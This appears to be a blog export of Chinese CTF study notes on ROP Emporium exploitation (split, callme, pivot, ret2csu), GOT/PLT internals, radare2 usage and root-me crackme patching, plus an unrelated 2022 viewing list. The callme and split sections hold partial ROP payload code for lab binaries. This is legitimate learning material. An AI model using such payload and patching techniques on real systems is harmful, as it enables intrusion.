<h3 id="split"><a href="#split" class="headerlink" title="split"></a>split</h3><p>32位<br>    payload += p32(system) +b’a’*4+ p32(catflag)<br>中间应该再加四个字节，作为返回地址</p>
<p>64位下传参</p>
<pre><code>[0x00400742]&gt; pdf
┌ 17: sym.usefulFunction ();
│           0x00400742      55             push rbp
│           0x00400743      4889e5         mov rbp, rsp
│           0x00400746      bf4a084000     mov edi, str.bin_ls         ; 0x40084a ; &quot;/bin/ls&quot; ; const char *string
│           0x0040074b      e810feffff     call sym.imp.system         ; int system(const char *string)
│           0x00400750      90             nop
│           0x00400751      5d             pop rbp
└           0x00400752      c3             ret</code></pre>
<p>字符串传到了 <code>$edi</code></p>
<p>所以要报字符串地址传到RDI中<br><a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/#Searching">https://www.megabeets.net/a-journey-into-radare-2-part-2/#Searching</a><br><a href="https://trustfoundry.net/basic-rop-techniques-and-tricks/">https://trustfoundry.net/basic-rop-techniques-and-tricks/</a></p>
<h3 id="如何搜索gadget"><a href="#如何搜索gadget" class="headerlink" title="如何搜索gadget"></a>如何搜索gadget</h3><p><a href="https://ropemporium.com/guide.html">https://ropemporium.com/guide.html</a><br>五种工具，我用了radare2 和 ROPgadget</p>
<h4 id="radare2中"><a href="#radare2中" class="headerlink" title="radare2中"></a>radare2中</h4><pre><code>/R [?] — Search for ROP gadgets
/R/ — Search for ROP gadgets with a regular expressions</code></pre>
<p>太暴力了</p>
<pre><code>[0x00400742]&gt; /R pop rdi
  0x004007c3                 5f  pop rdi
  0x004007c4                 c3  ret</code></pre>
<h4 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h4><p><code>ROPgadget --binary   | grep</code></p>
<h3 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h3><p>32位</p>
<pre><code>ROPgadget --binary ./callme32 --only &#39;add esp&#39;
callme1=p32(0x080484f0)
callme2=p32(0x08048550)
callme3=p32(0x080484e0)

addpopret=p32(0x080484aa)
#0x080484aa : add esp, 8 ; pop ebx ; ret
args1=p32(0xdeadbeef)
args2=p32(0xcafebabe)
args3=p32(0xd00df00d)

# rop1s
gadget=addpopret+args1+args2+args3
offset = 44
payload = b&#39;A&#39;*offset
payload += callme1+ gadget+  callme2+gadget+callme3+gadget</code></pre>
<p>64位<br>64位下传参</p>
<pre><code>│           0x0040091e      ba06000000     mov edx, 6
│           0x00400923      be05000000     mov esi, 5
│           0x00400928      bf04000000     mov edi, 4
│           0x0040092d      e8eefdffff     call sym.imp.callme_one</code></pre>
<p>所以用<br>    #0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret</p>
<h2 id="PLT-和-GOT-PLT"><a href="#PLT-和-GOT-PLT" class="headerlink" title="PLT 和 GOT.PLT"></a>PLT 和 GOT.PLT</h2><p> <a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html">https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html</a><br><code>函数和变量作为符号</code>被存在可执行文件中, 不同类型的符号又聚合在一起, 称为<code>符号表</code></p>
<p> <a href="https://ropemporium.com/guide.html#Appendix%20A">https://ropemporium.com/guide.html#Appendix%20A</a><br>how the PLT is used in <code>lazy binding</code>?<br>Lazy binding is a technique used by the dynamic linker<br>symbol lookups for function calls into shared objects are deferred until the first time a function is actually called.<br>对共享对象的函数调用的符号查找 只有当第一个函数真的调用时才查找<br>Two program sections are used to achieve this effect<br> the<code>procedure linkage table (.plt)</code>and part of the <code>global offset table (.got.plt).</code><br>Lazy binding may be disabled by setting the LD_BIND_NOW environment variable to a nonempty string or using the RTLD_NOW flag when calling dlopen().<br>The first time an external function is called it, <strong>must be resolved</strong>. After that, all calls to it will be passed straight through to the desired function<br><code>rabin2 -R    relocations</code></p>
<h3 id="plt-节"><a href="#plt-节" class="headerlink" title=".plt 节"></a>.plt 节</h3><p><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a><br>比如3 function stubs<br>take the form <code>jmp; push; jmp</code>;. Above the stubs a <code>push; jmp;</code></p>
<pre><code>► 0x8049030  &lt;puts@plt&gt;                  jmp    dword ptr [puts@got.plt] &lt;0x804c00c&gt; </code></pre>
<p>间接跳转</p>
<pre><code> pwndbg&gt; x/wx 0x804c00c
 0x804c00c &lt;puts@got.plt&gt;:    0x08049036

   0x8049036  &lt;puts@plt+6&gt;                push   0
   0x804903b  &lt;puts@plt+11&gt;               jmp    0x8049020 &lt;0x8049020&gt;</code></pre>
<p>it turns out that because we haven’t called puts before<br><strong>还没有使用puts，跳转到got又跳回到下一命令</strong><br>最后回到<code>.plt</code>表开头<br>      0x8049020                              push   dword ptr [<em>GLOBAL_OFFSET_TABLE</em>+4] &lt;0x804c004&gt;<br>     ► 0x8049026                              jmp    dword ptr [0x804c008] &lt;_dl_runtime_resolve&gt;</p>
<pre><code>pwndbg&gt; x/2xw 0x804c004
0x804c004:    0xf7ffd980    0xf7fe9730</code></pre>
<p>第一个在连接器数据段是<code>link_map地址</code>，第二个在连接器执行代码处是<code>_dl_runtime_resolve地址</code><br>plt开头两个是来第一次运行时查地址的</p>
<p>因此, 实际上(第一次)调用puts@plt就相当于调用了<br><code>_dl_runtime_resolve((link_map *)m, 0)!</code> 其中link_map提供了运行时的必要信息,<br>而0则是puts函数的偏移<code>(在puts@plt中push 0x0)</code>.</p>
<p>resolve执行完后：：<br>    pwndbg&gt; disass ‘puts@plt’<br>    Dump of assembler code for function puts@plt:<br>       0x08049030 &lt;+0&gt;:    jmp    DWORD PTR ds:0x804c00c<br>       0x08049036 &lt;+6&gt;:    push   0x0<br>       0x0804903b &lt;+11&gt;:    jmp    0x8049020<br>    End of assembler dump.</p>
<pre><code>pwndbg&gt; x/wx 0x804c00c
0x804c00c &lt;puts@got.plt&gt;:    0xf7e303c0
pwndbg&gt; info symbol 0xf7e303c0
puts in section .text of /lib/i386-linux-gnu/libc.so.6</code></pre>
<p>找到puts的代码地址</p>
<h3 id="攻击防御"><a href="#攻击防御" class="headerlink" title="攻击防御"></a>攻击防御</h3><p>防止写got.plt表<br><code>Enter relocations read-only, or RELRO.</code></p>
<p>a strategy was developed to allow looking up all of these addresses when the program was run and providing a mechanism to call these functions from libraries. This is known as relocation</p>
<h3 id="got"><a href="#got" class="headerlink" title=".got"></a>.got</h3><p>This is the GOT, or Global Offset Table. This is the <code>actual table of offsets </code>as filled in by the linker for external symbols.<br>.plt<br>This is the PLT, or Procedure Linkage Table. These are stubs that look up the addresses in the .got.plt section, and either jump to the right address, or trigger the code in the linker to look up the address. (If the address has not been filled in to .got.plt yet.)<br>.got.plt<br>This is the GOT for the PLT. It contains the<code>target addresses</code>(after they have been looked up) or an address back in the .plt to trigger the lookup. Classically, this data was part of the .got section</p>
<p>.GOT 开头包含实际地址，.plt开头是要跳转到目标<br>pwndbg&gt; x/i $pc<br>=&gt; 0x804845f &lt;main+36&gt;:    call   0x8048300 &lt;puts@plt&gt;</p>
<p>.got.plt表内容<br>got0: 本ELF动态段(.dynamic段)的装载地址<br>got1: 本ELF的link_map数据结构描述符地址<br>got2: _dl_runtime_resolve函数的地址<br><a href="https://ropemporium.com/image/example_gotplt_section.png"><img src="https://ropemporium.com/image/example_gotplt_section.png"></a></p>
<hr>
<h2 id="x86-get-pc-thunk-ax"><a href="#x86-get-pc-thunk-ax" class="headerlink" title="__x86.get_pc_thunk.ax"></a>__x86.get_pc_thunk.ax</h2><p>objdump -d main_pi | grep “__x86.get_pc_thunk.ax” -A 2<br>000006ad &lt;__x86.get_pc_thunk.ax&gt;:<br> 6ad:    8b 04 24                 mov    eax,DWORD PTR [esp]<br> 6b0:    c3                       ret<br>作用就是把esp(即返回地址)的值保存在eax(PIC寄存器)中, 在接下来寻址用<br>详见<a href="https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html">https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html</a></p>
<h2 id="CTF-WIKI-ROP"><a href="#CTF-WIKI-ROP" class="headerlink" title="CTF-WIKI ROP"></a>CTF-WIKI ROP</h2><p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/">https://ctf-wiki.org/pwn/linux/stackoverflow/basic-rop/</a><br>ROP</p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p><code>gdb vmmap </code></p>
]]></content>
      <categories>
        <category>rop_emporium</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>&lt;&lt;基本ROP_ropemporium pivot + ret2csu</title>
    <url>/2021/03/02/%E5%9F%BA%E6%9C%ACROP_ropemporium_pivot_+_ret2csu/</url>
    <content><![CDATA[<p>代码：<a href="https://github.com/Finsenty54/attack-code/tree/master/ROPemporium">https://github.com/Finsenty54/attack-code/tree/master/ROPemporium</a></p>
<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><pre><code>objdump -T libpivot32.so 查看所有符号
rabin2 -E ./libpivot.so 也可以查看
 -E              globally exportable symbols
objdump -j .text -d ./ret2csu
objdump -x ret2csu
gef➤  search-pattern 0x4004d0 查询含有0x4004d0 的地址</code></pre>
<a id="more"></a>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><a href="https://ctf-wiki.org/pwn/linux/stackoverflow/stack-intro/#_4">https://ctf-wiki.org/pwn/linux/stackoverflow/stack-intro/#_4</a></p>
<p>需要注意的是，32 位和 64 位程序有以下简单的区别</p>
<p>x86<br>函数参数在函数返回地址的上方<br>x64<br>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 寄存器中，如果还有更多的参数的话才会保存在栈上。<br>内存地址不能大于 0x00007FFFFFFFFFFF，6 个字节长度，否则会抛出异常。</p>
<h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>stack pivot<br>To “stack pivot” just means to move the stack pointer elsewhere.</p>
<p>用命令可以发现<br>10   0x0000077d 0x0000077d GLOBAL FUNC   43       foothold_function<br>18   0x00000974 0x00000974 GLOBAL FUNC   164      ret2win<br>偏移量为1F7</p>
<p>stack smash<br>EBP-0X28<br>可以写入0x38<br>40+4 溢出到返回地址</p>
<p>0x080487b4      ff7508         push dword [arg_8h]<br>第一次写入的地方是指针，我看错了，以为直接写入arg_8h处，这里放第二段较长的ROP链</p>
<p>大体思路：先调用一次foothold，将got表项的内容加载进寄存器，而不是表项地址，加上ret2win的偏移，调用</p>
<h2 id="ret2rsu"><a href="#ret2rsu" class="headerlink" title="ret2rsu"></a>ret2rsu</h2><p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。</p>
<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>ret2win 的三个参数放在<br>│           ; arg uint32_t arg1 @ rdi<br>│           ; arg uint32_t arg2 @ rsi<br>│           ; arg uint32_t arg3 @ rdx</p>
<h3 id="查看-libc-csu-init代码"><a href="#查看-libc-csu-init代码" class="headerlink" title="查看__libc_csu_init代码"></a>查看__libc_csu_init代码</h3><p><code>objdump -j .text -d ./ret2csu</code></p>
<pre><code>0000000000400640 &lt;__libc_csu_init&gt;:
  400640:    41 57                    push   %r15
  400642:    41 56                    push   %r14
  400644:    49 89 d7                 mov    %rdx,%r15
  400647:    41 55                    push   %r13
  400649:    41 54                    push   %r12
  40064b:    4c 8d 25 9e 07 20 00     lea    0x20079e(%rip),%r12        # 600df0 &lt;__frame_dummy_init_array_entry&gt;
  400652:    55                       push   %rbp
  400653:    48 8d 2d 9e 07 20 00     lea    0x20079e(%rip),%rbp        # 600df8 &lt;__do_global_dtors_aux_fini_array_entry&gt;
  40065a:    53                       push   %rbx
  40065b:    41 89 fd                 mov    %edi,%r13d
  40065e:    49 89 f6                 mov    %rsi,%r14
  400661:    4c 29 e5                 sub    %r12,%rbp
  400664:    48 83 ec 08              sub    $0x8,%rsp
  400668:    48 c1 fd 03              sar    $0x3,%rbp
  40066c:    e8 5f fe ff ff           callq  4004d0 &lt;_init&gt;
  400671:    48 85 ed                 test   %rbp,%rbp
  400674:    74 20                    je     400696 &lt;__libc_csu_init+0x56&gt;
  400676:    31 db                    xor    %ebx,%ebx
  400678:    0f 1f 84 00 00 00 00     nopl   0x0(%rax,%rax,1)
  40067f:    00 
  400680:    4c 89 fa                 mov    %r15,%rdx
  400683:    4c 89 f6                 mov    %r14,%rsi
  400686:    44 89 ef                 mov    %r13d,%edi
  400689:    41 ff 14 dc              callq  *(%r12,%rbx,8)
  40068d:    48 83 c3 01              add    $0x1,%rbx
  400691:    48 39 dd                 cmp    %rbx,%rbp
  400694:    75 ea                    jne    400680 &lt;__libc_csu_init+0x40&gt;
  400696:    48 83 c4 08              add    $0x8,%rsp
  40069a:    5b                       pop    %rbx
  40069b:    5d                       pop    %rbp
  40069c:    41 5c                    pop    %r12
  40069e:    41 5d                    pop    %r13
  4006a0:    41 5e                    pop    %r14
  4006a2:    41 5f                    pop    %r15
  4006a4:    c3                       retq   
  4006a5:    90                       nop
  4006a6:    66 2e 0f 1f 84 00 00     nopw   %cs:0x0(%rax,%rax,1)
  4006ad:    00 00 00 </code></pre>
<p>直接用ROPgadget搜有些代码搜不到的</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>要使用ret2csu<br>就需要绕过call<br>这是[ ]指针，需要解引用，即调用函数</p>
<p><code>objdump -x ret2csu </code></p>
<pre><code> 10 .init         00000017  00000000004004d0  00000000004004d0  000004d0  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
 11 .plt          00000030  00000000004004f0  00000000004004f0  000004f0  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
 12 .text         00000192  0000000000400520  0000000000400520  00000520  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
 13 .fini         00000009  00000000004006b4  00000000004006b4  000006b4  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE</code></pre>
<p>可以看到一共有四块代码<br>选择.init</p>
<pre><code>┌─[zentreisender@parrotos]─[~/Documents/ret2csu]
└──╼ $objdump -j .init -d ./ret2csu 

./ret2csu:     file format elf64-x86-64


Disassembly of section .init:

00000000004004d0 &lt;_init&gt;:
  4004d0:    48 83 ec 08              sub    $0x8,%rsp
  4004d4:    48 8b 05 1d 0b 20 00     mov    0x200b1d(%rip),%rax        # 600ff8 &lt;__gmon_start__&gt;
  4004db:    48 85 c0                 test   %rax,%rax
  4004de:    74 02                    je     4004e2 &lt;_init+0x12&gt;
  4004e0:    ff d0                    callq  *%rax
  4004e2:    48 83 c4 08              add    $0x8,%rsp
  4004e6:    c3                       retq   </code></pre>
<p>gdb-ref<br><code>gef➤  search-pattern 0x4004d0</code></p>
<pre><code>  0x600e38 - 0x600e44  →   &quot;\xd0\x04\x40[...]&quot; </code></pre>
<p>同时rbx=0 rbp=1</p>
<p>csu代码片段使用了两次</p>
]]></content>
      <categories>
        <category>rop_emporium</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>学习r2</title>
    <url>/2020/09/24/%E5%AD%A6%E4%B9%A0r2/</url>
    <content><![CDATA[<h2 id="逆向-学习r2"><a href="#逆向-学习r2" class="headerlink" title="逆向 学习r2"></a>逆向 学习r2</h2><p><a href="https://www.megabeets.net/a-journey-into-radare-2-part-1/">https://www.megabeets.net/a-journey-into-radare-2-part-1/</a></p>
<h3 id="RABIN2-—-Binary-program-info-extractor"><a href="#RABIN2-—-Binary-program-info-extractor" class="headerlink" title="RABIN2 — Binary program info extractor"></a>RABIN2 — Binary program info extractor</h3><pre><code>$ rabin2 -I megabeets_0x1</code></pre>
<p><code>stripped false</code><br>没有剥离符号表<br><code>static   false</code> //所以是动态链接</p>
<a id="more"></a>
<h3 id="r2-radare2"><a href="#r2-radare2" class="headerlink" title="r2 //radare2"></a>r2 //radare2</h3><h4 id="ie"><a href="#ie" class="headerlink" title="ie"></a>ie</h4><pre><code>[0x08048370]&gt; ie</code></pre>
<p>ie 命令可以打印出程序的入口点</p>
<hr>
<h4 id=""><a href="#" class="headerlink" title="?"></a>?</h4><p>在任何一个命令后面添加 ? 来获得更多的子命令信息：<br>    [0x08048370]&gt; i?</p>
<hr>
<h4 id="aa"><a href="#aa" class="headerlink" title="aa"></a>aa</h4><p>使用 ‘aa’ 命令来分析文件</p>
<pre><code>[0x08048370]&gt; a?</code></pre>
<p>aa?<br>aaa[?]              autoname functions after aa (see afna)</p>
<hr>
<h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p>flag 是所有类似特征的集合，展示所有的 flag ，用 ‘fs’ 命令<br>    [0x08048370]&gt; fs</p>
<h4 id="f"><a href="#f" class="headerlink" title="f"></a>f</h4><p> f         list flags (will only list flags from selected flagspaces<br>    [0x08048370]&gt; fs imports; f</p>
<hr>
<h4 id="iz"><a href="#iz" class="headerlink" title="iz"></a>iz</h4><p>iz – 列出数据段里的字符串</p>
<hr>
<h4 id="axt"><a href="#axt" class="headerlink" title="axt"></a>axt</h4><pre><code>[0x08048370]&gt; axt @@ str.*</code></pre>
<p> axt [addr]      find data/code references to this address</p>
<p><code>@@                   # foreach iterator command:</code></p>
<hr>
<h4 id="x"><a href="#x" class="headerlink" title="x"></a>x</h4><p>| x @@ sym.*          run ‘x’ over all flags matching ‘sym.’ in current flagspace</p>
<hr>
<h4 id="s"><a href="#s" class="headerlink" title="s"></a>s</h4><p>s    # Help for the seek commands. See ?$? to see all variables</p>
<hr>
<h4 id="afl"><a href="#afl" class="headerlink" title="afl"></a>afl</h4><p>af?<br>用 ‘afl’ 指令，这个指令代表着分析函数列表（Analyze Functions List）.</p>
<hr>
<h4 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h4><p>s main<br>用 ‘pdf’（输出反汇编代码）</p>
<hr>
<h4 id="m"><a href="#m" class="headerlink" title="m"></a>m</h4><p>m<key> 可以用来标记特定的偏移地址，之后输入对应的key就可以跳转到你设置的地方.</p>
<hr>
<h4 id="V"><a href="#V" class="headerlink" title="V"></a>V</h4><p>V 视图模式<br>p进入下一个模式，q退出视图模式</p>
<p>shell 里输入 VV来进入图形模式<br> Left/Down/Up/Right = h/j/k/l<br>视图帮助 ?</p>
<hr>
<p>视图模式直接跳转到 beet 函数<br>上面说过的方框中的数字吗？这里直接按 3 就可以了</p>
<p>图形模式，使用 g 命令跳转到一个函数<br>gd 命令，d 就是每一个跳转或者调用代码旁边的 字母<br>快速跳转命令 o<br>返回命令q</p>
<dl><dt>图形模式执行命令</dt><dd>? 0x88</dd></dl><p>寻找函数<br>f sym.<tab> 来定位出 sym.beet 函数<br>s sym.beet<br>pdf @ sym.beet 命令，‘@’ 表示临时查找</p>
<hr>
<h4 id="ahi"><a href="#ahi" class="headerlink" title="ahi"></a>ahi</h4><p>:&gt; ahi s @@=0x080485a3 0x080485ad 0x080485b7<br>ahi s       set base to string (1)<br>ahi s 是用来设置字符串特定的偏移地址<br>@@是一个迭代器，可以用来接受后面输入的多个参数,执行完这条命令后</p>
<hr>
<h4 id="r"><a href="#r" class="headerlink" title="r"></a>r</h4><p>r 图形模式刷新</p>
<hr>
<h3 id="rahash2"><a href="#rahash2" class="headerlink" title="rahash2"></a>rahash2</h3><p>rahash2 包含很多种算法来求证一个文件或者字符串的校验值,具体的用法请使用 ‘man rahash2 ‘.<br>在r2里执行命令：!rahash2 -E rot -S s:13 -s “Megabeets\n”</p>
<hr>
<h4 id="00"><a href="#00" class="headerlink" title="00"></a>00</h4><p>oo           reopen current file<br>ood [args]      # reopen in debug mode (with args)</p>
<hr>
<h4 id="dc"><a href="#dc" class="headerlink" title="dc"></a>dc</h4><p>dc   Execution continuation commands<br>| dc                           Continue execution of all children</p>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>我的2022</title>
    <url>/2023/01/02/%E6%88%91%E7%9A%842022/</url>
    <content><![CDATA[<h3 id="电影："><a href="#电影：" class="headerlink" title="电影："></a>电影：</h3><ul>
<li>长津湖，</li>
<li>大明劫，</li>
<li>玻璃樽，</li>
<li>生化寿尸(01.22)，</li>
<li>蝴蝶效应(01.26)，</li>
<li>不要抬头(02,20)，</li>
<li>咒怨1,2(03.05，03.06)，</li>
<li>古惑仔3，</li>
<li>古惑仔1，</li>
<li>古惑仔2(03.11.12)，</li>
<li>古惑仔5(03.13)，</li>
<li>蜘蛛侠：英雄无归，</li>
<li>古惑仔6(03.14)，</li>
<li>特务迷城(03.24)，</li>
<li>狙击手(03.28)，</li>
<li>你的名字(03.29)，<a id="more"></a></li>
<li>moonfall(04.01)，</li>
<li>鸟人(04.05)，</li>
<li>生死停留(04.09)，</li>
<li>哭声(04.13)，</li>
<li>新蝙蝠侠(04.18)，</li>
<li>兹山鱼谱(04.22)，</li>
<li>长津湖之水门桥(04,30)，</li>
<li>套装(05.07)，</li>
<li>瞬息全宇宙（05.20），</li>
<li>壮志凌云（06.07），</li>
<li>目中无人（06.08），</li>
<li>英雄（07.12），</li>
<li>烈日灼心（07.17），</li>
<li>谁是超级英雄（07.21），</li>
<li>铁血战士：猎物（08.06），</li>
<li>壮志凌云2（08.26），</li>
<li>铁血战士1987（08.31），</li>
<li>隐入尘烟（09.18），</li>
<li>星球大战第四集：新希望（09.27），</li>
<li>星球大战第五集：帝国反击战（09.30），</li>
<li>星球大战第六集：绝地归来（10.1），</li>
<li>一场很（没）有必要的春晚（10.14），</li>
<li>狩猎（10.16），</li>
<li>新奥特曼（10.21），</li>
<li>西线无战事（10.28），</li>
<li>碟中谍4（11.4），</li>
<li>碟中谍6（11.12），</li>
<li>子弹列车（11.14），</li>
<li>黑亚当（11.19），</li>
<li>新神榜杨戬（11.20），</li>
<li>雷神4（11.23），</li>
<li>阿凡达（11.26），</li>
<li>刀（11.28），</li>
<li>遗落战境（12.04），</li>
<li>星球大战前传1：幽灵的威胁，</li>
<li>星球大战前传2：克隆人的进攻（12.09），</li>
<li>万里归途（12.21），</li>
<li>龙虎武师（12.26），</li>
<li>我们的1944（12.27），</li>
<li>犯罪都市2</li>
</ul>
<h3 id="纪录片："><a href="#纪录片：" class="headerlink" title="纪录片："></a>纪录片：</h3><ul>
<li>再见了所有的福音战士！庵野秀明的1214日，</li>
<li>环绕日本(02.24完)，</li>
<li>台灣菁英戰士-傲氣飛鷹(08.03)</li>
</ul>
<h3 id="电视剧："><a href="#电视剧：" class="headerlink" title="电视剧："></a>电视剧：</h3><ul>
<li>僵尸校园，</li>
<li>黑袍纠察队第二季，</li>
<li>爱死亡机器人（05.23），</li>
<li>怪奇物语 第四季，</li>
<li>毛骗第一季（06.16），第二季，</li>
<li>浴血黑帮 第六季（09.12），</li>
<li>睡魔（10.24），</li>
<li>安多（12.03），</li>
<li>黑袍纠察队第二季（12.08），</li>
<li>老友记第一季（12.30）</li>
</ul>
<h3 id="动漫："><a href="#动漫：" class="headerlink" title="动漫："></a>动漫：</h3><ul>
<li>EVA TV版，</li>
<li>EVA 新世纪福音战士剧场版：Air / 真心为你，</li>
<li>EVA 新世纪福音战士新剧场版1.11：序，</li>
<li>EVA 新世纪福音战士新剧场版2.22：破(01.23)，</li>
<li>福音战士新剧场版：Q ヱヴァンゲリヲン新劇場版：Q (2.2)，</li>
<li> 新·福音战士剧场版：终 シン・エヴァンゲリオン劇場版:│▌(2.26)，</li>
<li>进击的巨人 最终季 part1(04.27)，</li>
<li>进击的巨人 最终季 part2(04.29)，</li>
<li>紫罗兰永恒花园 剧场版(05.12)，</li>
<li>赛博朋克：边缘行者（10.05），</li>
<li>灵能百分百第三季</li>
</ul>
<h3 id="游戏："><a href="#游戏：" class="headerlink" title="游戏："></a>游戏：</h3><ul>
<li>流放之路 3.17，3.18，3.19，3.20</li>
<li>战神4</li>
</ul>
<h3 id="小说："><a href="#小说：" class="headerlink" title="小说："></a>小说：</h3><ul>
<li>妖刀记</li>
</ul>
]]></content>
      <categories>
        <category>日记</category>
      </categories>
  </entry>
  <entry>
    <title>逆向_root_me_2</title>
    <url>/2020/10/07/%E9%80%86%E5%90%91_root_me_2/</url>
    <content><![CDATA[<h2 id="逆向-root-me"><a href="#逆向-root-me" class="headerlink" title="逆向 root_me"></a>逆向 root_me</h2><h3 id="PE-NET"><a href="#PE-NET" class="headerlink" title="PE .NET"></a>PE .NET</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection">https://www.root-me.org/en/Challenges/Cracking/PE-DotNet-0-protection</a></p>
<a id="more"></a>
<h3 id="MIPS-ELF-MIPS-Basic-Crackme"><a href="#MIPS-ELF-MIPS-Basic-Crackme" class="headerlink" title="MIPS. ELF MIPS - Basic Crackme"></a>MIPS. ELF MIPS - Basic Crackme</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-MIPS-Basic-Crackme">https://www.root-me.org/en/Challenges/Cracking/ELF-MIPS-Basic-Crackme</a></p>
<p>在MIPS架构中，“ $ ra”寄存器保存返回地址，类似于x86指令指针“ EIP”</p>
<h3 id="ELF-fake-instrucations"><a href="#ELF-fake-instrucations" class="headerlink" title="ELF  fake instrucations"></a>ELF  fake instrucations</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-x86-No-software-breakpoints">https://www.root-me.org/en/Challenges/Cracking/ELF-x86-No-software-breakpoints</a></p>
<pre><code>dis main  
gdb-peda$ set disassembly-flavor intel //汇编用intel语言显示
gdb-peda$ i r $edx //显示edx值
ni //ni/si都是汇编级别的断点定位。si会进入汇编和C函数内部,ni不会
//这两个命令（si/ni）所针对的是汇编指令，而s/n针对的是源代码</code></pre>
<p><code>jz</code> 表示当<code>zf =1 </code>时跳转，即结果为0跳转。<br><code>jnz</code> 即 <code>zf=0 </code>时跳转，即结果不为0 跳转。</p>
<pre><code>gdb-peda$ i r //全显示
gdb-peda$ set $eax=0

gdb-peda$ x/s $eax //查看寄存器指向的内容

call WPA(&quot;toto&quot;, &quot;toto&quot;) //直接在gdb中运行命令？？</code></pre>
<h3 id="ELF-ptrace"><a href="#ELF-ptrace" class="headerlink" title="ELF ptrace"></a>ELF ptrace</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-x86-Ptrace">https://www.root-me.org/en/Challenges/Cracking/ELF-x86-Ptrace</a></p>
<p><em>Load the application into <code>IDA pro</code>,search main function,press <code>F5 </code>to disassemble it,get the code below:</em><br><code>IDA 按F5 反编译 生成伪代码</code></p>
<hr>
<p><code>r2 -ww ./ch3.bin</code></p>
<pre><code> -w           open file in write mode
 ww foobar            write wide string &#39;f\x00o\x00o\x00b\x00a\x00r\x00&#39;

 wx 9090     write two intel nops</code></pre>
<p><code>[0x080482f0]&gt; wx eb @ 0x0804841A</code><br>Short Jump（短跳转）机器码 EB</p>
<p><code>pd N             disassemble N instructions</code></p>
<pre><code>gdb-peda$ i b
 set $al=$dl </code></pre>
]]></content>
      <tags>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向_root_me_3</title>
    <url>/2020/10/08/%E9%80%86%E5%90%91_root_me_3/</url>
    <content><![CDATA[<h2 id="ELF-x86-No-software-breakpoints"><a href="#ELF-x86-No-software-breakpoints" class="headerlink" title="ELF x86 - No software breakpoints"></a>ELF x86 - No software breakpoints</h2><h3 id="看反汇编，大致了解过程"><a href="#看反汇编，大致了解过程" class="headerlink" title="看反汇编，大致了解过程"></a>看反汇编，大致了解过程</h3><p>这是众所周知的<code>反调试</code>技术，它不能在应用程序本身中<code>放置任何软件断点</code>。因为当我们在<code>用户模式</code>应用程序中遇到<code>断点</code>时，代码中将放入<code>0xCC（int3）</code>，因此计算将是错误的，并将生成错误的<code>校验和</code>.</p>
<a id="more"></a>
<p>这是在ecx中计算一种散列值，它基于入口点的整个代码。如果我们对函数进行任何更改，值将不再相同，从而阻止我们编辑二进制文件.</p>
<p>计算整个<code>text 指令的和</code>，所以放入<code>0xCC</code>会 报错，也就是改变的指令。</p>
<hr>
<h3 id="移位运算符"><a href="#移位运算符" class="headerlink" title="移位运算符"></a>移位运算符</h3><p>a&lt;&lt;3<br><code>a的内容不改变</code></p>
<p><code>edx &amp; 0xff</code><br>取最后8位</p>
<hr>
<h3 id="g"><a href="#g" class="headerlink" title="g++"></a>g++</h3><pre><code>g++主要用来编译c++文件，g++编译c++文件是会连接libc++。
gcc主要用来编译c文件，也可编译c++，但gcc编译c++文件默认不连接libc++。</code></pre>
<hr>
<h3 id="移位"><a href="#移位" class="headerlink" title="移位"></a>移位</h3><p>移位时，移出的位数全部丢弃，移出的空位补入的数与左移还是右移有关。如果是<code>左移</code>，则规定补入的数全部是<code>0</code>；如果是<code>右移</code>，还与被移位的数据是否带<code>符号</code>有关。若是<code>不带符号数</code>，则补入的数全部为<code>0</code>；若是<code>带符号数</code>，则补入的数全部等于原数的最左端位上的原数(即<code>原符号位</code>)</p>
<hr>
<h3 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h3><p>引入了命名空间这个概念，它可作为<code>附加信息来区分</code>不同库中相同名称的函数、类、变量等。使用了命名空间即定义了上下文。本质上，命名空间就是定义了<code>一个范围</code>。</p>
<p>可以使用 <code>using namespace</code> 指令，这样在使用命名空间时就可以<code>不用在前面加上</code>命名空间的名称。这个指令会告诉编译器，后续的代码将使用指定的命名空间中的名称。</p>
<hr>
